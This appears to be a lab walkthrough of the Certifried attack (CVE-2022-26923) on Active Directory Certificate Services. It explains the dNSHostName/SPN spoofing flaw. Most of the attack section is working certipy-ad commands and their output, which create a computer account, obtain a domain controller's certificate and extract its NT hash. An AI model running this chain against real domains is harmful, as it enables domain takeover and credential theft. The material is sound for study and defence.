This attack scenario falls into the CVE category as it is categorized as [CVE-2022-26923](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923)
This vulnerability enables domain users to obtain permissions such as `Validated write to DNS host name` and `Validated write to service principal name` when creating a computer account. 
As a result, they can modify the computer account's DNS hostname (`dNSHostName`) and service principal name (SPN) attributes.


## Requisites
As named in the introduction paragraph this is all about a CVE so if the CA hasn't been patched after May 2022 then there is a good probability that the server is vulnerable.
Just in case check the CVE article [CVE-2022-26923](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923)


## Enumeration
To identify potential Templates that can be used to carry an *Certifried* type attack we can do:
**Linux:**
```
certipy-ad req -u 'BlWasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -dc-ip 10.129.228.237 -template User

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 4
[*] Got certificate with UPN 'blwasp@lab.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'blwasp.pfx'
```
What we are looking for here is the **Certificate has no object SID** to know if the CA is vulnerable to this attack vector. Nonetheless, we must also have enough permission to edit objects in AD and by default normal users can join computer object to AD up to 10 times.


# Attacks
Prior to the patch, when computer accounts requested a certificate using the Machine template, the certificate mapping was based on the `dNSHostName` property value.
Before the update, a constraint error is raised if we try to change the `dNSHostName` to match another computer account. This was because when the `dNSHostName` property is edited, the domain controller ensures that the existing SPNs of the account are updated to reflect the new DNS hostname. If the SPNs already exist for another account in Active Directory, the domain controller raises a constraint violation.
To bypass this check and discover the vulnerability, Olivier Lyak performed the following steps:
1. Clear the SPNs, particularly those corresponding to the `dNSHostName` value, i.e., the ones with fully-qualified hostnames (e.g., HOST/SRV01.DOMAIN.LOCAL).
2. Change the `dNSHostName` to the DNS hostname of the target (e.g., DC.DOMAIN.LOCAL). The constraint violation will not be raised since there are no SPNs to update.
3. Request a certificate for the spoofed computer account using the Machine template. The Certificate Authority will use the `dNSHostName` value for identification and issue a certificate for the spoofed machine account.
Abusing this vulnerability, we can impersonate any computer in the domain, including the domain controller.

- We start by adding a new computer object to AD  with `-user <machine name>` to define the machine's name and `-dns DC02.LAB.LOCAL` to define the name of the machine we want to impersonate(we want to cause a name crash)
```
certipy-ad account create -u 'blwasp@lab.local' -p 'Password123!' -dc-ip 10.129.228.134 -user NEWMACHINE -dns DC02.LAB.LOCAL

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Creating new account:
    sAMAccountName                      : NEWMACHINE$
    unicodePwd                          : ikFRmm6VMXcjmD5T
    userAccountControl                  : 4096
    servicePrincipalName                : HOST/NEWMACHINE
                                          RestrictedKrbHost/NEWMACHINE
    dnsHostName                         : DC02.LAB.LOCAL
[*] Successfully created account 'NEWMACHINE$' with password 'ikFRmm6VMXcjmD5T'
```
- Now we need to request a certificate on behalf of the freshly created computer object.
```
certipy-ad req -u 'NEWMACHINE$' -p 'ikFRmm6VMXcjmD5T' -ca lab-LAB-DC-CA -template 'Machine' -dc-ip 10.129.228.134

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 11
[*] Got certificate with DNS Host Name 'DC02.LAB.LOCAL'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'dc02.pfx'
```
As you see here since the patch is missing the *voluntary* name crash made the CA to issue the certificate for DC02 and not for the machine we just created.
- Lastly, can this be used for a machine takeover.
```
certipy-ad auth -pfx dc02.pfx

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: dc02$@lab.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'dc02.ccache'
[*] Trying to retrieve NT hash for 'dc02$'
[*] Got hash for 'dc02$@lab.local': aad3b435b51404eeaad3b435b51404ee:38ac4a4da<SNIP>
```


## Troubleshooting
If you will ever get the error during authentication:
```
┌──(root㉿kali)-[/home/user/Downloads]
└─# certipy-ad auth -pfx dc02.pfx 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: dc02$@lab.local
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
```
This basically means that the *DC02* has no **PKINT** setup to bypass it please follow the article named *"Troubleshooting"*
